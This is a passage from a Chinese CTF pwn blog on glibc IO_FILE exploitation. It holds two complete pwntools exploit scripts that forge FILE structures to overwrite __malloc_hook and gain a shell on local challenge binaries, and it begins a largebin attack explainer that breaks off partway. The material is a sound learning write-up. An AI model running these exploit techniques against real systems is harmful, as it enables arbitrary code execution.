class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> temp; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  temp = size;</span><br><span class="line">  <span class="keyword">while</span> ( size &gt; <span class="number">0x300000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too much bytes to do stackoverflow.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  global_ptr = (__int64)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !global_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;padding and ropchain: &quot;</span>);</span><br><span class="line">  input_data((<span class="type">char</span> *)global_ptr, size);</span><br><span class="line">  *(_BYTE *)(global_ptr + temp) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制size&lt;0x300000,但是并不能防止mmap攻击(大小为0x200000)。可以看到程序中多分配了一位<code>(__int64)malloc(size + 1)</code>之后最后一位写成了0，乍一看似乎没有什么漏洞。但是注意最后写0用的是temp，而一开始我们可以把temp写的很大，从而堆将mmap到libc之前，这样就造成了一个<code>\x00</code>的libc任意地址写。但是由于没有free，直接off-by-null也有困难。这里尝试劫持IO_FILE。</p><p>劫持之前先看一下未修改时IO_FILE结构</p><p><img src="/2022/01/29/IO-file/image-20220130104222375.png" alt="image-20220130104222375"></p><p>对照条件，发现条件1，条件2，条件3都已经满足，只需要用\x00来修改write_start和write_end即可。<strong>但是只能增加\x00字节，并且hook都不是以\x00结尾的，怎么修改呢？</strong></p><p>这里也是比较巧妙，因为IO_buf_end<strong>恰好是在00开头的位置</strong>，如下图所示。</p><p><img src="/2022/01/29/IO-file/image-20220130121002654.png" alt="image-20220130121002654"></p><p>我们可以尝试劫持_IO_buf_base，末尾写\x00，那么base就变成了end，我们就可以操作end,将其修改为<code>__malloc_hook+0x8</code>即可。（由于程序中没有free，写不了free_hook）下图为我们成功写入的操作。</p><p><img src="/2022/01/29/IO-file/image-20220130121241433.png" alt="image-20220130121241433"></p><p>之后一次写，是从_IO_buf_end开始往后写。但是直接覆盖非常容易破坏stdin结构，这里我们伪造一个file结构体(没想到这个pwntools也集成了)</p><p>需要注意的是，<strong>只有当_IO_read_ptr=IO_read_end的时候，才会写到我们为在的buf_base中。然而在调试程序的时候发现：如果不清空缓冲，直接写会导致我们的伪造file写到堆中！</strong></p><p><img src="/2022/01/29/IO-file/image-20220130133504477.png" alt="image-20220130133504477"></p><p><strong>因此需要清空缓冲区。在源码中，每次输入换行符的时候会fflish一次缓冲区。根据调试看到每次输入后，会有8byte的read buffer，因此在rop输入的时候，连续输入八次加上换行符即可</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2022/01/29/IO-file/image-20220130143837798.png" alt="image-20220130143837798"></p><p>然而我们还不能直接写og，因为这里没有能触发的。。只能尝试rop，会想到这道题题目是rop，只能说设计的太巧妙了。通过调试找到rop的偏移之后得到shell。最后这个ROP真的难找。</p><p><img src="/2022/01/29/IO-file/image-20220130143044167.png" alt="image-20220130143044167"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>这里很奇怪，第71行必须要进入gdb一次之后按q退出才能有shell，大概是改了输入输出流的原因。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./stackoverflow&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc-2.24.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># cmd+=&quot;b *0x400A45\n&quot;</span></span><br><span class="line">    <span class="comment"># cmd+=&quot;b *0x4009B7\n&quot; # break before rop chain</span></span><br><span class="line">    <span class="comment"># cmd+=&quot;b *0x400ACD\n&quot; # break at loop</span></span><br><span class="line">    cmd+=<span class="string">&quot;b *0x400a23\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x07dd52</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_stdin=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">io_stdin_end=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="number">0xe0</span>+<span class="number">0x10</span></span><br><span class="line">io_buf_base=io_stdin+<span class="number">7</span>*<span class="number">8</span></span><br><span class="line">io_buf_end=io_buf_base+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;trigger stackoverflow:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x6c28e8</span>)) <span class="comment"># just to overwrite writebase</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;stackoverflow:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x300000</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ropchain:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;trigger stackoverflow:&#x27;</span>)</span><br><span class="line">io.send(p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;ropchain:&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_file_jumps=libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lock_addr=libc_base+<span class="number">0x3c3770</span><span class="comment"># libc.symbols[&#x27;_IO_stdfile_0_lock&#x27;]</span></span><br><span class="line"></span><br><span class="line">fake_file=FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line">fake_file._old_offset= <span class="number">0xffffffffffffffff</span></span><br><span class="line">fake_file._lock= lock_addr</span><br><span class="line">fake_file._IO_buf_end=malloc_hook+<span class="number">8</span></span><br><span class="line">fake_file.vtable=io_file_jumps</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake file:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(fake_file))</span><br><span class="line">file_data=<span class="built_in">bytes</span>(fake_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(file_data)</span></span><br><span class="line"><span class="comment"># payload=file_data[fake_file.offset(&#x27;_IO_buf_end&#x27;):] #start from IO_buf_end to overwrite malloc_hook</span></span><br><span class="line">begin = fake_file.struntil(<span class="string">&#x27;_IO_buf_base&#x27;</span>)</span><br><span class="line">payload = file_data[<span class="built_in">len</span>(begin)+<span class="number">1</span>:]</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload=payload.ljust(malloc_hook-io_buf_end,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># align to malloc_hook</span></span><br><span class="line">payload+=p64(<span class="number">0x400a23</span>)*<span class="number">2</span> <span class="comment"># rop chain</span></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;trigger stackoverflow:&#x27;</span>)</span><br><span class="line"><span class="comment"># payload = p64(0xbabecafe)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prdi_ret=<span class="number">0x0000000000400b43</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(prdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="劫持stdout任意地址读写"><a href="#劫持stdout任意地址读写" class="headerlink" title="劫持stdout任意地址读写"></a>劫持stdout任意地址读写</h2><p>之前劫持stdin时，只能进行写，这是因为stdin只能做输入数据到缓冲区。但是stdout既可以读也可以写。读很好理解，可以写的原因是：<strong>构造好输出缓冲区将其改为想要任意写的地址，当输出数据可控时，会将数据拷贝至输出缓冲区，即实现了将可控数据拷贝至我们想要写的地址</strong></p><h3 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h3><p>这个其实在泄露libc的题目中经常用到，一般也不会用来泄露别的数据。原理方面不深究了，记住payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stdout的flag开始</span></span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址</p><h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><p>在fwrite中，将会调用<code>_IO_new_file_xsputn</code>，源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123; </span><br><span class="line">...</span><br><span class="line">    <span class="comment">// 判断输出缓冲区还有多少空间</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出如果我们能控制缓冲区指针，就可以随意写。只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里还是跟着<a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">ray-cp师傅博客</a></p><p>完成例子。题目和脚本都在这位师傅博客上。</p><p>程序直接给了我们读写stdout的能力，实际上完全就是这里学到的stdout任意读写的利用。程序会对vatble跳表指针做检测，因此无法FSOP。因此我们的思路是</p><ol><li>首先写stdout来泄露libc</li><li>写stdout实现任意地址写</li></ol><p>这里注意，不能改got表和exit_hook因为程序是full_relro，并且没有exit。因此只能改malloc_hook然后通过printf很大数据来触发。但是这里og尝试了很多也没有能跑出来的，网上是0x4f322，但是本地测试的不行。虽然没有打通，但是也算是学到了吧。</p><p><img src="/2022/01/29/IO-file/image-20220131093735141.png" alt="image-20220131093735141"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./babyprintf_ver2&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc64.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># cmd+=&quot;brva 0x788\n&quot;# break at read</span></span><br><span class="line">    <span class="comment"># cmd+=&quot;brva 0x740\n&quot;# break at loop</span></span><br><span class="line">    cmd+=<span class="string">&quot;b malloc\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">code_info = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">13</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;code_info: &quot;</span> + <span class="built_in">hex</span>(code_info))</span><br><span class="line">code_base = code_info - <span class="number">0x202010</span></span><br><span class="line">success(<span class="string">&quot;code_base: &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># step1: leak libc_addr</span></span><br><span class="line"><span class="comment"># fake the whole file structure</span></span><br><span class="line">stdout_addr = code_base + <span class="number">0x202020</span></span><br><span class="line">fake_stdout = FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">flag&amp;=~<span class="number">8</span></span><br><span class="line">flag|=<span class="number">0x800</span></span><br><span class="line">flag|=<span class="number">0x8000</span></span><br><span class="line">fake_stdout.flags = flag</span><br><span class="line">fake_stdout._IO_write_base = code_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">fake_stdout._IO_write_ptr = code_base + elf.got[<span class="string">&#x27;read&#x27;</span>]+<span class="number">8</span></span><br><span class="line">fake_stdout._IO_read_end = fake_stdout._IO_write_base</span><br><span class="line">fake_stdout.fileno = <span class="number">1</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(stdout_addr+<span class="number">8</span>) <span class="comment"># which points to our structure,so +8 is just our structure</span></span><br><span class="line">payload+=<span class="built_in">bytes</span>(fake_stdout)</span><br><span class="line"><span class="built_in">print</span>(fake_stdout)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: fake file structure to arbitary write</span></span><br><span class="line">og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0x4f322</span>,<span class="number">0xe569f</span>,<span class="number">0xe5858</span>,<span class="number">0xe585f</span>,<span class="number">0xe5863</span>]</span><br><span class="line">payload3 = p64(og[<span class="number">3</span>] + libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stdout2 = FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">flag&amp;=~<span class="number">8</span></span><br><span class="line">flag|=<span class="number">0x800</span></span><br><span class="line">flag|=<span class="number">0x8000</span></span><br><span class="line">fake_stdout2.flags = flag</span><br><span class="line">fake_stdout2._IO_write_ptr = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">fake_stdout2._IO_write_end = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base + <span class="number">8</span></span><br><span class="line"><span class="comment"># fake_stdout2._IO_write_ptr = libc_base + 0x619f60 # exit_hook</span></span><br><span class="line"><span class="comment"># fake_stdout2._IO_write_end = libc_base + 0x619f60 + 8</span></span><br><span class="line">fake_stdout2.fileno = <span class="number">1</span></span><br><span class="line">payload2 = payload3*<span class="number">2</span></span><br><span class="line">payload2+=p64(stdout_addr+<span class="number">8</span>)</span><br><span class="line">payload2+=<span class="built_in">bytes</span>(fake_stdout2)</span><br><span class="line"><span class="built_in">print</span>(fake_stdout2)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;permitted!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">payload4 = <span class="string">&quot;a&quot;</span>*<span class="number">0x500</span></span><br><span class="line"><span class="comment"># io.sendline(p64(libc_base + 0x3ed8e8))</span></span><br><span class="line">io.sendline(<span class="string">&quot;%n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="stdin任意读条件"><a href="#stdin任意读条件" class="headerlink" title="stdin任意读条件"></a>stdin任意读条件</h3><p><img src="/2022/01/29/IO-file/image-20220131094002074.png" alt="image-20220131094002074"></p><h3 id="stdout任意读条件"><a href="#stdout任意读条件" class="headerlink" title="stdout任意读条件"></a>stdout任意读条件</h3><p><img src="/2022/01/29/IO-file/image-20220131094041571.png" alt="image-20220131094041571"></p><h3 id="stdout任意写条件"><a href="#stdout任意写条件" class="headerlink" title="stdout任意写条件"></a>stdout任意写条件</h3><p><img src="/2022/01/29/IO-file/image-20220131094111426.png" alt="image-20220131094111426"></p><p>注意伪造stdout的flag位时，最好按照上面第二个exp伪造。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="number">0</span></span><br><span class="line">flag&amp;=~<span class="number">8</span></span><br><span class="line">flag|=<span class="number">0x800</span></span><br><span class="line">flag|=<span class="number">0x8000</span></span><br><span class="line">fake_stdout2.flags = flag</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV1yK4y197Fg">https://www.bilibili.com/video/BV1yK4y197Fg</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write</a></p><p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin-attack</title>
      <link href="/2022/01/29/largebin-attack/"/>
      <url>/2022/01/29/largebin-attack/</url>
      
        <content type="html"><![CDATA[<p>对于largebin attach的学习，这段时间决定好好复习一下基础。PWN还是很吃基础的。heap还有一些攻击方法，后续也会接着学习。</p><span id="more"></span><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p>2.29的largebin attack可以说是unsortedbin attack的替代品。在2.29之前，unsortedbin attack的作用是能够在任意地址写入一个main_arena地址（可控的堆地址）。可以用来控制循环，或者伪造vtable打fsop。后者是在只能控制unsortedbin时一种很常用的一种攻击手法。然而由于2.29的保护措施，unsortedbin attack几乎不能使用了。</p><h2 id="largebin-attack原理"><a href="#largebin-attack原理" class="headerlink" title="largebin attack原理"></a>largebin attack原理</h2><p>攻击产生的原因是在malloc时，如果在unsortedbin中没有找到可以切割的块，就会把他们按照各自的大小，放到smallbin和largebin中。在其中缺少对largebin跳表指针的检测。以下是入bin操作的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">              &lt; (<span class="type">unsigned</span> <span 